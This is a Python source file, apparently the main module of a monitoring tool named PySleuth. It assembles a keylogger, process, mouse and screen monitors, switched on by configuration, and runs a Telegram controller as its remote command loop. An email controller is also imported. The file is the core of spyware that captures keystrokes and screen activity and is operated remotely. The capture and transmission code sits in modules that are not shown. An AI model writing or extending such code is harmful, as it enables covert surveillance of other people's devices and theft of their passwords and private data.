from .core.data import Data
from .config import ConfigHandler
from .controllers import KeyLoggerController
from .controllers import ProcessMntrController
from .controllers import MouseMntrController
from .controllers import ScreenMntrController
from .controllers import EmailController
from .controllers import TelegramController


class Struct:
    pass


class PySleuth:
    RUNNING = False

    def __init__(self):
        self.ctrls = Struct()
        self._initComponents()

        self.telegramCtrl = TelegramController(self)

        self.connectSlots()

    def start(self):
        self.RUNNING = True

        assert self.telegramCtrl is not None

        try:
            self.telegramCtrl.startWorker()  # blocking !
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(e)
        finally:
            self.onShutdown()

    def onShutdown(self):
        if self.RUNNING:
            self.RUNNING = False

        assert not self.RUNNING

    def __del__(self):
        self.onShutdown()

    def connectSlots(self):
        self.telegramCtrl.SIG_shutdown.connect(self, "onShutdown")

    def _initComponents(self):
        components = ConfigHandler().getCfgRun()

        if components.getboolean("keylogger"):
            self._initKeylogger()

        if components.getboolean("process-monitor"):
            self._initProcessMonitor()

        if components.getboolean("mouse-monitor"):
            self._initMouseMonitor()

        if components.getboolean("screen-monitor"):
            self._initScreenMonitor()

    def _initKeylogger(self):
        setattr(self.ctrls, "keyloggerctrl", KeyLoggerController())

    def _initProcessMonitor(self):
        setattr(self.ctrls, "procMntrCtrl", ProcessMntrController())

    def _initMouseMonitor(self):
        setattr(self.ctrls, "mouseMntrCtrl", MouseMntrController())

    def _initScreenMonitor(self):
        setattr(self.ctrls, "screenMntrCtrl", ScreenMntrController())
